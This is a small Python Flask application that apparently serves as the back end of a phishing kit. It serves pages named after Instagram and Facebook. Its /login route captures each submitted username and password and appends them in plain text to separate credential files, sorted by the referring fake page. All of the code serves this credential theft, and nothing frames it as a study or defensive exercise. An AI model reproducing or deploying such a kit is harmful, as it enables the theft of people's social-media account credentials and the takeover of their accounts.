from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__, template_folder='.')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/instagram.html')
def instagram():
    return render_template('instagram.html')

@app.route('/facebook.html')
def facebook():
    return render_template('facebook.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if 'instagram' in request.referrer:
        filename = 'instagram_credentials.txt'
    elif 'facebook' in request.referrer:
        filename = 'facebook_credentials.txt'
    else:
        return 'Invalid request'
    
    with open(filename, 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
